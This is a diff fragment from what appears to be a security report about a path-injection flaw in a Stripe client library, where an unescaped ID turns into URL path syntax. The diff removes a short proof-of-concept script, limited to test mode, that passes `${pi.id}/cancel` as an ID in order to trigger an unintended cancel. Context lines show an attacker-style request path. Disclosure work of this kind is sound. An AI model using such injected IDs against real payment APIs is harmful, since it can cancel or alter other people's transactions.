@@ -85,24 +85,6 @@ POST /v1/payment_intents/pi_attacker/cancel
  
 That proves the `id` became path syntax instead of remaining a single encoded ID segment.
  
-### Step 3 — Optional Safe Live Verification (Stripe Test Mode Only)
- 
-```js
-const stripe = require('./cjs/stripe.cjs.node.js')(process.env.STRIPE_TEST_API_KEY);
- 
-const pi = await stripe.paymentIntents.create({
-  amount: 1000,
-  currency: 'usd',
-});
- 
-await stripe.paymentIntents.update(`${pi.id}/cancel`, {
-  cancellation_reason: 'abandoned',
-});
- 
-const after = await stripe.paymentIntents.retrieve(pi.id);
-console.log(after.status); // should show canceled if exploitable
-```
- 
 ---
  
 ## E. Exploit Chain Possibility
